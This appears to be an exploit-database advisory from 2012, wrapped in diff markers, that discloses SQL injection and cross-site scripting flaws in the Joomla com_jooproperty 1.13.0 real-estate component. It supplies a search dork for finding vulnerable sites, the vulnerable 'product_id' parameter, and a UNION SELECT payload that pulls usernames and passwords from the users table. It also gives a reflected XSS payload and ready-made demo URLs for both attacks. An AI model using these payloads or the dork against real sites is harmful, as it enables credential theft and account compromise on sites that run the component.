@@ -1,0 +1,83 @@
+ 1               #########################################              1
+ 0               I'm D4NB4R member from Inj3ct0r Team                   1
+  1               #########################################              0
+ 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+ #Exploit Title: Joomla com_jooproperty SQL injection && Cross site scripting Vulnerability
+
+ Dork: inurl:com_jooproperty
+ 
+ Date: [10-12-2012]
+ 
+ Author: Daniel Barragan "D4NB4R"
+ 
+ Twitter: @D4NB4R
+ 
+ Vendor: http://www.jooproperty.com/
+ 
+ Version: 1.13.0
+
+ Date Added:  12 November 2012
+ 
+ License: GPLv2 or later Commercial]
+
+ Compatibility: Joomla! 2.5 Series
+
+ Information: http://extensions.joomla.org/extensions/vertical-markets/real-estate/22500
+ 
+ Tested on: [Linux(Arch)-Windows(7ultimate)]
+
+ 
+ Descripcion: 
+
+JooProperty is a real estate component developed for Joomla 1.7 and 2.5 with complex integrated booking features, 
+price calculation for different seasons and comment and rating functions.
+The component is based on com-property for Joomla 1.5 of Fabio Ueltzinger and offers the possibility to import 
+the database of com-property V3 and V4 to migrate your realty website to Joomla 2.5.
+All property relevant information like categories, locations, description, extras/amenities, season, price 
+categories, prices and special fees can be translated.
+
+
+ Vulnerable Parameter Name: 
+
+                                  product_id
+
+ Parameter Type: 
+
+                                  Querystring  
+
+ Method: 
+                                  Get
+
+
+ Attack Pattern Sql:
+
+                 -{Valid id}%20and%201=0%20union%20select%201,(select group_concat(username,0x3D,password)%20from%20dy978_users)+--+D4NB4R 
+
+ Attack Pattern Xss:
+                   
+               ?layout=modal&option=com_jooproperty&product_id=" onmouseover%3dprompt() bad%3d"&view=booking
+
+
+ Exploit Demo: 
+
+    SQLi : SQL injection
+
+           http://localhost/?option=com_jooproperty&view=booking&layout=modal&product_id=1%20and%201=0%20union%20select%201,(select group_concat(username,0x3D,password)%20from%20dy978_users)+--+D4NB4R 
+
+     xss : Cross site scripting
+
+           http://localhost/?layout=modal&option=com_jooproperty&product_id=%22%20onmouseover%3dprompt%28%29%20bad%3d%22&view=booking
+
+  Greetz:  All Member Inj3ct0r  Team * m1nds group (www.m1nds.com)* pilot * aku * navi_terrible * dedalo * ksha
+  * shine * devboot * r0073r * indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3 Jago-dz * Kha&miX * T0xic
+  * Ev!LsCr!pT_Dz * By Over-X *Saoucha * Cyber Sec * theblind74 * onurozkan * n2n * Meher Assel
+  * L0rd CruSad3r * MaYur * MA1201 * KeDar * Sonic * gunslinger_ * SeeMe * RoadKiller Sid3^effects
+  * aKa HaRi * His0k4 * Hussin-X * Rafik * Yashar * SoldierOfAllah * RiskY.HaCK * Stake * MR.SoOoFe
+  * ThE g0bL!N * AnGeL25dZ * ViRuS_Ra3cH * Sn!pEr.S!Te
+
+
+_____________________________________________________
+Daniel Barragan "D4NB4R" 2012
+
+           
